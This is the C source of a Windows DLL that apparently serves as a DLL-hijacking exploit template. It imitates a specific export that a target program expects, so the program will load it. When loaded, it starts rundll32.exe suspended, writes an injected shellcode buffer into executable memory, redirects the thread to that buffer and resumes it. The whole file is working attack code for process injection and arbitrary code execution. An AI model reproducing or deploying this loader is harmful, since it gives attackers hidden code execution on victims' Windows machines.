#include <windows.h>

#define SIZE 2000

/* The payload will be injected into this array */
unsigned char code[SIZE] = "PAYLOAD:";

/* Exactly imitate the export that the binary expects */
class AT {
  class CWclApp {
    public:
    static __declspec(dllexport) CWclApp &__cdecl GetCurrentSession() {
      static CWclApp test;
      return test;
    }
  };
};

void ExecutePayload(void) {
  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  // Start up the payload in a new process
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);

  // Create a suspended process, write shellcode into stack, make stack RWX, resume it
  if(CreateProcess(0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
    CONTEXT ctx;
    LPVOID ep;

    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    GetThreadContext(pi.hThread, &ctx);

    ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SIZE, 0);
    ctx.Eip = (DWORD) ep;

    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
  }
  ExitThread(0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      ExecutePayload();
      break;

    case DLL_THREAD_ATTACH:
      break;

    case DLL_THREAD_DETACH:
      break;

    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}